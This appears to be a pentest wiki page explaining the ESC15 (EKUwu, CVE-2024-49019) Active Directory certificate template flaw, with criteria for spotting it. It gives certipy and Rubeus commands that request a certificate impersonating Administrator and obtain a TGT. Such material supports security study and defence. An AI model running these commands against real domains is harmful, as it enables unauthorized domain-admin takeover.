---
title: 'ESC15: EKUwu Application Policies (CVE-2024-49019)'
description: 'ESC15: EKUwu Application Policies (CVE-2024-49019).'
---
# ESC15: EKUwu Application Policies (CVE-2024-49019)

Ah, ESC15. Discovered recently (and affectionately dubbed EKUwu by its finders), this vulnerability targets the intersection of Certificate Templates and the Version 1 template schema.

The vulnerability (CVE-2024-49019) occurs when a Version 1 certificate template allows low-privileged users to enroll, and has an `Application Policies` extension (`msPKI-Certificate-Application-Policy`) that includes a privileged EKU (like Client Authentication or Any Purpose), even if the primary `Extended Key Usage` extension (`pKIExtendedKeyUsage`) explicitly restricts the certificate's usage to something boring (like Server Authentication only).

When Active Directory processes the certificate for authentication, the `Application Policies` extension can effectively override or merge with the `EKU` extension, allowing a certificate meant for a server to be used for client authentication.

## The Attack Path

### 1. Spot the EKUwu
You're looking for a Version 1 certificate template (`msPKI-Template-Schema-Version: 1`) that:
* Grants enrollment to a low-privileged group.
* Contains a privileged OID (like Client Authentication `1.3.6.1.5.5.7.3.2`) in the `msPKI-Certificate-Application-Policy` attribute.
* Does *not* have that same OID in the `pKIExtendedKeyUsage` attribute.
* Has the `ENROLLEE_SUPPLIES_SUBJECT` flag enabled.

### 2. Request the Certificate
Exploiting ESC15 is functionally identical to ESC1. You found a template that AD will ultimately treat as a Client Authentication template, and it allows you to supply a SAN.

```bash
certipy req -u 'john' -p 'Passw0rd!' -ca 'domain-CA' -template 'V1VulnTemplate' -upn 'Administrator@domain.local'
```

### 3. Authenticate
The resulting certificate will have the privileged EKU safely tucked away in the Application Policies extension. When you present this to the KDC via Rubeus or Certipy, it will honor the Application Policy and grant you a TGT as the Administrator.

```powershell
Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /ptt
```

!!! tip
    Microsoft patched this via CVE-2024-49019 in late 2024. If you find this in the wild today, you should politely remind the admins to install their Windows updates.
